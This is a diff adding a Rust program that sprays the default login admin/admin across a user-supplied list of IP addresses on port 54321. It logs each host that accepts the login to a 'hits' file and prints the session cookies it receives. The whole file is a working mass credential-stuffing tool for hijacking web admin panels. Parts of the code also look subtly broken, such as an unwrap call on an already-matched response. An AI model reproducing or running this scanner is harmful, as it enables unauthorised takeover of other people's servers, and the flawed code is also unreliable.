@@ -1,0 +1,134 @@
+use std::fs::{File, OpenOptions};
+use std::io::{Write, BufRead, BufReader};
+use std::sync::{Arc, Mutex};
+use rayon::prelude::*;
+
+fn main() {
+    let port: String = "54321".to_string();
+    let data = vec![
+        ("username", "admin"),
+        ("password", "admin"),
+    ];
+    let filename = input("Provider:");
+    let file = File::open(&filename).expect("Failed to open file");
+    let outputfilename = format!("hits-{}", filename.clone());
+    std::fs::File::create(&outputfilename).expect("Failed to create file");
+    let output_file = Arc::new(Mutex::new(
+        OpenOptions::new()
+            .append(true)
+            .open(&outputfilename)
+            .expect("Failed to open file"),
+    ));
+    let reader = BufReader::new(file);
+    let client = reqwest::blocking::Client::new();
+
+    reader
+        .lines()
+        .collect::<Vec<_>>()
+        .par_iter()
+        .for_each(|line| {
+        let ip = line.as_ref().expect("Failed to read line").trim().to_string();
+        let request_data = RequestData {
+            ip: ip.clone(),
+            port: port.clone(),
+            data: data.clone(),
+            result: output_file.lock().unwrap().try_clone().expect("Failed to clone file"),
+        };
+
+        post_request(&client, request_data);
+    });
+}
+
+struct RequestData {
+    ip: String,
+    port: String,
+    data: Vec<(&'static str, &'static str)>,
+    result: File,
+}
+
+fn is_success(response: &mut Result<reqwest::blocking::Response, reqwest::Error>) -> bool {
+    match response{
+        Ok(response) => {
+            if let Ok(json) = &response.unwrap().json::<serde_json::Value>() {
+                if json["success"] == true {
+                    return true;
+                }else{
+                    return false;}
+            }else{
+                return false;
+            }
+        }
+        Err(_) => {return false;}
+    }
+}
+
+fn post_request(client: &reqwest::blocking::Client, mut request_data: RequestData) {
+    let url = format!("http://{}:{}/login", request_data.ip, request_data.port);
+
+    let mut response = reqwest::blocking::Client::new()
+    .post(&url)
+    .form(&request_data.data)
+    .timeout(std::time::Duration::from_secs(2))
+    .send();
+
+    if is_success(&mut response){ 
+        println!("成功 {}", request_data.ip);
+        request_data
+            .result
+            .write((request_data.ip + "\n").as_bytes())
+            .expect("Failed to write file");
+
+        if let Some(set_cookie_header) = response.unwrap().headers().get("Set-Cookie") {
+            if let Ok(value) = set_cookie_header.to_str() {
+                // Process the value of the Set-Cookie header
+                println!("Set-Cookie: {}", value);
+            } else {
+                println!("Failed to parse Set-Cookie header value");
+            }
+        } else {
+            println!("Set-Cookie header not found in the response");
+        }
+    }
+
+    /* 
+    match client
+        .post(&url)
+        .form(&request_data.data)
+        .timeout(std::time::Duration::from_secs(2))
+        .send() 
+    {
+        Ok(response) => {
+            if let Ok(json) = &response.json::<serde_json::Value>() {
+                if json["success"] == true {
+                    println!("成功 {}", request_data.ip);
+                    request_data
+                        .result
+                        .write((request_data.ip + "\n").as_bytes())
+                        .expect("Failed to write file");
+
+                    if let Some(set_cookie_header) = response.headers().get("Set-Cookie") {
+                        if let Ok(value) = set_cookie_header.to_str() {
+                            // Process the value of the Set-Cookie header
+                            println!("Set-Cookie: {}", value);
+                        } else {
+                            println!("Failed to parse Set-Cookie header value");
+                        }
+                    } else {
+                        println!("Set-Cookie header not found in the response");
+                    }
+                }
+            }
+        }
+        Err(_) => {}
+    }
+    */
+}
+
+fn input(prompt: &str) -> String {
+    println!("{}", prompt);
+    let mut input = String::new();
+    std::io::stdin()
+        .read_line(&mut input)
+        .expect("Failed to read line");
+    input.trim().to_string()
+}
